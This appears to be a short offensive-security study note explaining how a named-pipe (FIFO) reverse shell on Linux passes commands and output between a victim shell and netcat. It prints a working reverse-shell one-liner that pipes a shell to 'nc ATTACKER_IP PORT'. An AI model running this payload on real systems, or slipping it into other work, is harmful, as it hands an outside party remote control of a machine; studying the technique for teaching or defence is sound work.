---
date: 2026-03-03
tags:
  - shell
  - exploitation
  - linux
  - offensive-security
---
# Named pipe (FIFO) Reverse Shell
---
A shell needs two directions of communications
1. commands go in
2. output comes back
Normal Unix pipes only move data one way.

This reverse shell technique uses a named pipe (FIFO) to simulate a two-way channel between the shell and the network.

## What a shell normally needs
For a remote shell to work, the attacker must be able to:
3. send commands
4. receive outputs

Example:
```shell
attacker → whoami → victim shell  
victim shell → www-data → attacker
```

So the connection must behave like this:
```shell
attacker ⇄ shell
```
In two directions.

## Why normal pipes won't work
A normal pipe only moves data in one direction.

Example:
```shell
A | B
```

means:
```shell
stdout(A) → stdin(B)
```

## How the data loop works
Payload:
```shell
cat /tmp/f | sh -i | nc ATTACKER_IP PORT >/tmp/f
```

Attacker sends command: `id`

That command travels through the network to `nc`
```shell
attacker → nc
```

Netcat writes it into the FIFO: `nc ... >/tmp/f`
```shell
id → /tmp/f
```

`cat` reads from the FIFO: `cat /tmp/f`
```shell
id → cat
```

The command goes into the shell: `cat /tmp/f | sh -i`
```shell
id → shell
```

The shell output goes to netcat: `sh -i 2>&1 | nc ATTACKER_IP PORT`

So the output becomes:
```shell
uid=33(www-data)
```

which flows:
```shell
shell → nc → attacker
```
